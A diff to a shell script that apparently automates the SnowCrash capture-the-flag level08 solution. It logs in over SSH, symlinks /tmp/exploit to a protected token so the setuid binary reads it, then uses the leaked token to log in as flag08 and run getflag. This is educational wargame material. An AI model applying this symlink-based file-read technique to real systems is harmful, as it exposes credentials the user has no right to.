@@ -108,10 +108,19 @@ main() {
     level08_username="level08";
     level08_password=$(cat "$CURR_DIR_PATH/../../level07/flag");
 
+    flag08_socket_path=$(get_ssh_socket_path "snowcrash_flag08_socket") || exit 1;
+    flag08_username="flag08";
+    flag08_password="";
+
     init_ssh_socket "$level08_socket_path" "$host" "$port" "$level08_username" "$level08_password";
     ssh_exec_via_socket "$level08_socket_path" "$host" "$port" "$level08_username" "ln -sf /home/user/level08/token /tmp/exploit";
-    checkflag=$(ssh_exec_via_socket "$level08_socket_path" "$host" "$port" "$level08_username" "/home/user/level08/level08 /tmp/exploit");
+    flag08_password=$(ssh_exec_via_socket "$level08_socket_path" "$host" "$port" "$level08_username" "/home/user/level08/level08 /tmp/exploit");
     close_ssh_socket "$level08_socket_path" "$host" "$port" "$level08_username";
+
+    init_ssh_socket "$flag08_socket_path" "$host" "$port" "$flag08_username" "$flag08_password";
+    checkflag_str=$(ssh_exec_via_socket "$flag08_socket_path" "$host" "$port" "$flag08_username" "getflag");
+    checkflag=$(echo -n "$checkflag_str" | head -n 1 | awk  '{print $NF}');
+    close_ssh_socket "$flag08_socket_path" "$host" "$port" "$flag08_username";
 
     flag_outpath="$CURR_DIR_PATH/../flag";
     echo "Checkflag: $checkflag";
